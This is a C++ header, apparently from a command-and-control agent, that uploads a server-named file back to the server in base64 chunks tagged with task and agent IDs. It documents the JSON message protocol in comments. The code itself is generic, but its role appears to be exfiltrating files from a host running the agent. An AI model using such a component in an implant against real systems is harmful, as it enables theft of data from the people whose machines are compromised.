#pragma once
//Contains various functions that handle upload file tasks
//Macros and dependences are imported in main.cpp and/or config.h (imported by main before this file)

// Uploads a single chunk of a file to the server
// Returns success/failure
int uploadChunk(std::string file_id, const std::string &data)
{
    /*
    HT: 5
    Client:
    {
        "chunk": "<base64_data>",
        "file_id": "<file_id>"
    }
    Server Response:
    {
        "message": "OK"
    }
    */

    json j;
    std::string encodedChunk;
    Base64Encode(data, &encodedChunk);

    j["content"] = encodedChunk; // Specifications say "chunk" but server says "content"
    j["file_id"] = file_id;

    std::string sendStr = j.dump();
    std::string response = convert_and_send(sendStr, 5);

    json response_json = json::parse(response);
    if (!response_json.contains("message") || response_json["message"] != "OK")
    {
        COUT("uploadChunk error: server indicated failure.");
        return FALSE;
    }

    return TRUE;
}

// Uploads an entire file to the server in chunks
int uploadFile(std::string *task_id, const std::string &file_data, std::string *file_id_out, std::string input)
{
    /////////////////////
    // Send UploadStart
    /////////////////////
    /*
    HT: 4
    Client:
    {
        "task_id": "<task_id>",
        "content": "",
        "path": "<path>"
    }
    Server Response:
    {
        "message": "OK",
        "id": "<file_id>"
    }
    */
    size_t chunk_size = 1024 * 64;

    json j;
    j["task_id"] = *task_id;
    j["content"] = "";
    j["path"] = input;

    std::string sendStr = j.dump();
    std::string response = convert_and_send(sendStr, 4);

    json response_json = json::parse(response);
    if (!response_json.contains("message") || response_json["message"] != "OK" || !response_json.contains("id"))
    {
        COUT("uploadFile error: failed to start upload.");
        return FALSE;
    }

    std::string file_id = response_json["id"];
    *file_id_out = file_id;

    /////////////////////
    // Send UploadChunk
    /////////////////////
    size_t total_size = file_data.size();
    size_t offset = 0;

    while (offset < total_size)
    {
        size_t remaining = total_size - offset;
        size_t this_chunk_size = (remaining > chunk_size) ? chunk_size : remaining;
        std::string chunk = file_data.substr(offset, this_chunk_size);

        BOOL bRet = uploadChunk(file_id, chunk);
        if (!bRet)
        {
            COUT("uploadFile error: failed to upload chunk at offset " << offset);
            return FALSE;
        }

        offset += this_chunk_size;
    }

    /////////////////////
    // Send UploadEnd
    /////////////////////
    /*
    HT: 6
    Client:
    {
        "task_id": "<task_id>",
        "agent_id": "<agent_id>",
        "result": "",
        "status": 4
    }
    Server Response:
    {
        "message": "OK"
    }
    */
    j["task_id"] = *task_id;
    j["agent_id"] = global_agent_id;
    j["result"] = "";
    j["status"] = 4;

    sendStr = j.dump();
    response = convert_and_send(sendStr, 6);

    response_json = json::parse(response);
    if (!response_json.contains("message") || response_json["message"] != "OK")
    {
        COUT("uploadFile error: server indicated failure on UploadEnd");
        return FALSE;
    }

    return TRUE;
}